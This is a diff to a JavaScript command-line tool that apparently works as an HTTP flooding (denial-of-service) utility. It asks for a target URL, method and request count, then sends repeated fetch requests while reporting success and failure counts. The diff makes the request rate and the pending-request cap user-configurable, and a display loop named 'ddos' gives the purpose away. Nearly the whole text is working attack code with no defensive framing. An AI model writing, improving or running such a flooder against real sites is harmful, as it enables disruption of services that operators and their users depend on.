@@ -322,6 +322,8 @@ const tools = (action)=>{
         var ip = prompt("IP : ");
         var methd = prompt("Method [GET/POST] : ");
         let cout = prompt("Req : ");
+        let speed = prompt("Speed MS[1req/ms] : ");
+        let limits = prompt("Limit Pending [100 pending stop] : ");
         let total = cout;
         let limit = 0, succes = 0, failed = 0, loglimit = 0, totals = 0;
         var log = ``;
@@ -331,6 +333,7 @@ const tools = (action)=>{
         console.log(`
   Send To : ${ip}
   Request Remeaining : ${cout} | ${(totals / total * 100).toFixed(2)}%
+  Request : 1 Req/${speed}ms
   Pending : ${limit}
   Succes : ${succes}
   Failed : ${failed}
@@ -341,48 +344,48 @@ const tools = (action)=>{
         if (methd == `GET`||methd == `POST`&&ip.includes("http://")||ip.includes("https://")){
           let requ = setInterval(()=>{
             if (cout < 1){}else{
-              if (limit > 99||lock){
-                lock = true;
-                if (limit < 1){
-                  lock = false;
+              if (loglimit > 19){
+                log = ``
+                loglimit=0;
+              }else{
+                if (limit > (limits-1)||lock){
+                  lock = true;
+                  if (limit < 1){
+                    lock = false;
+                  }else {
+                    // limit--;
+                  }
                 }else {
-                  // limit--;
-                }
-              }else {
-                if (loglimit > 14){
-                  log = ``
-                  loglimit=0;
-                }else {
-                  cout--;
-                  totals++;
-                  limit++;
-                  fetch(ip, { method: methd }).then((data)=>{
-                    if (data.status == 200){
-                      succes++;
-                      limit--;
-                      loglimit++;
-                      log += `
+                    cout--;
+                    totals++;
+                    limit++;
+                    fetch(ip, { method: methd }).then((data)=>{
+                      if (data.status == 200){
+                        succes++;
+                        limit--;
+                        loglimit++;
+                        log += `
   Succes ${methd} on ${ip} at req ${cout} status ${data.status} | ${data.statusText}`
-                    }else {
+                      }else {
+                        failed++;
+                        limit--;
+                        loglimit++;
+                        log += `
+  Failed ${methd} on ${ip} at req ${cout} status ${data.status} | ${data.statusText}`
+                      }
+                    }).catch(()=>{
                       failed++;
                       limit--;
                       loglimit++;
-                      log += `
-  Failed ${methd} on ${ip} at req ${cout} status ${data.status} | ${data.statusText}`
-                    }
-                  }).catch(()=>{
-                    failed++;
-                    limit--;
-                    loglimit++;
-                    log+=`
+                      log+=`
   Fetch Error, Check IP or Method`
-                  })
-                //   log += `
-                // Succes`
+                    })
+                  //   log += `
+                  // Succes`
                 }
               }
             }
-          }, 50)
+          }, speed)
           //display
           let ddos = setInterval(()=>{
             if (cout < 1){
